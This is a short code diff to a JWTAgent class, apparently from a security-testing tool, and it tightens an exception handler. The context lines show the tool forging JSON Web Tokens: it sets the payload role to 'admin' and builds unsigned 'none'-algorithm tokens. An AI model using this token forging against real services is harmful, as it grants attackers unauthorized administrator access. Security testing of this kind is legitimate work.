@@ -341,7 +341,7 @@ class JWTAgent(BaseAgent):
                 payload['role'] = 'admin'
                 p_json = json.dumps(payload, separators=(',', ':')).encode()
                 p_b64 = base64.urlsafe_b64encode(p_json).decode().strip('=')
-            except:
+            except Exception as e:
                 p_b64 = parts[1] # Fallback to original if decode fails
 
             # Valid 'none' tokens have empty signature, but sometimes need trailing dot
